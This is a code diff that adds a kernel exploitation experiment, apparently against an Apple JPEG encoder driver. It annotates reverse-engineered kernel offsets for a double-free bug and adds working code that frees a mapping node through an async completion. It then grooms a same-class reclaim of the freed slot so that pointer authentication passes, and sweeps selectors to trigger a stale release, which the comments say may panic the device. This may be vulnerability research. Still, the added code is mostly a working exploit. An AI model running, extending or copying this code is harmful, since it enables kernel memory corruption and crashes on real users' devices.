@@ -105,8 +105,13 @@ static void j_pack(uint8_t *big, uint32_t src, uint32_t dst, uint32_t w, uint32_
     *(uint32_t *)(big + A14_23F77_JPEG_DEST_ID_OFF) = dst;
     *(uint32_t *)(big + 0x428) = w;
     *(uint32_t *)(big + 0x42c) = h;
-    /* murk second-defect fire (24B156 decode 2026-11-18): +0x4f0 gate arms the
-       +0x488 object (created-once at 0x9052228/0x9052240, released once and
+    /* murk second-defect fire (24B156 decode 2026-11-18, corrected 2026-11-20 —
+       findings 2026-11-20_jpeg488_stale_completion.md): +0x4f0 gate arms the
+       +0x488 object (an 88-byte/0x58 IOSurface memory-mapping registration node
+       for the RST table; +0x28 = the mapped kVA, +0x30 = size; created-once at
+       0x9052228/0x9052240; the release is finish_io's 0x90514d4-0x90514f0 block
+       (NOT 0x9051a38 — that is a +0x2b8 deref); the gate writers are
+       startEncoderExt 0x90545fc / startEncoder2024 0x9055100; released once and
        never cleared at teardown 0x9051a38) = the latent double-free/stale-
        completion window. The gate is client-settable (startEncoderExt 0x9051b90
        / startEncoder2024 0x901ad14 write +0x4f0). */
@@ -349,6 +354,53 @@ static void j_vt_cb(void *refcon, void *src, OSStatus status, VTDecodeInfoFlags 
     j_pack(big, srcID, id8, 8, 8);
     j_fire(&F, 0, 5, "dst8-LOCKED");
     if (iosUnlock) iosUnlock(dst8, 0, NULL);
+
+    /* ══ THE STALE-RELEASE EXPERIMENT (2026-11-20 decode, both-trees law) ══
+       The only release path (finish_io's bl 0x9065fac -> ldr [x1] 0x9065fc0 ->
+       autda 0x9065fcc -> vtable+0x28 release) is guarded only by gate!=0 &&
+       obj!=NULL and clears NEITHER +0x488 NOR +0x4f0; the cleanup fn never
+       zeroes +0x488; creation has no NULL-check. A SECOND finish_io on the
+       same request releases a DANGLING node. A same-class reclaim (a fresh
+       0x58 node from another encode) PASSES the autda (the same-class auth
+       law) -> premature release of a LIVE node -> refcount 1->0 -> free ->
+       the double-free cascade. PANIC-POSSIBLE — the sweep below is the
+       one-tap-per-fresh-boot lane. */
+    jlog("\n--- THE STALE-RELEASE EXPERIMENT (the 0x58 RST-node double-free) ---");
+    if (acall) {
+        /* (1) the completion-producing async submit: finish_io #1 releases the node */
+        j_pack(big, srcID, id8, 8, 8);
+        j_fire(&F, 1, 5, "stale-1-async");
+        {
+            mach_msg_empty_rcv_t msg;
+            memset(&msg, 0, sizeof msg);
+            kern_return_t wkr = mach_msg(&msg.header, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
+                                         0, sizeof msg, F.wake, 2000, MACH_PORT_NULL);
+            jlog("  [stale-1] wake %s (kr=0x%x) — finish_io #1 %s",
+                 (wkr == KERN_SUCCESS) ? "RECEIVED" : "timeout", (unsigned)wkr,
+                 (wkr == KERN_SUCCESS) ? "RAN: the node is released, +0x488 dangles"
+                                       : "did not fire (no completion)");
+        }
+        /* (2) the groom: a second async submit arms a FRESH 0x58 node —
+               the same-class reclaim of the freed slot (autda will PASS) */
+        j_pack(big, srcID, id8, 8, 8);
+        j_fire(&F, 1, 5, "stale-2-groom");
+        usleep(50000);
+        jlog("  [stale-2] groom submitted — a fresh 0x58 node should hold the slot");
+        /* (3) the sync lane on the armed request: sweep sels 1-7 for the
+               interruptOccurred_gated selector -> finish_io #2 -> the STALE
+               RELEASE (PANIC-POSSIBLE from here to the sweep's end) */
+        for (uint32_t s = 1; s <= 7; s++) {
+            j_pack(big, srcID, id8, 8, 8);
+            j_fire(&F, 0, s, "stale-3-sync-sweep");
+            usleep(20000);
+        }
+        jlog("  [stale-3] sync sweep done — SURVIVED = the runtime selector map is");
+        jlog("  needed (no sel reached interruptOccurred_gated); a panic (autda");
+        jlog("  @0x9065fcc / fault @0x9065fc0 = no reclaim, or the 0x58-zone");
+        jlog("  refcount/double-free = THE CASCADE) = the stale release FIRED.");
+    } else {
+        jlog("  no async channel — the experiment needs the async fire lane");
+    }
 
     jlog("counts ok=%d dest-fail=%d TIMEOUT=%d Error=%d other=%d",
          F.n_ok, F.n_2cc, F.n_2d6, F.n_2bc, F.n_other);
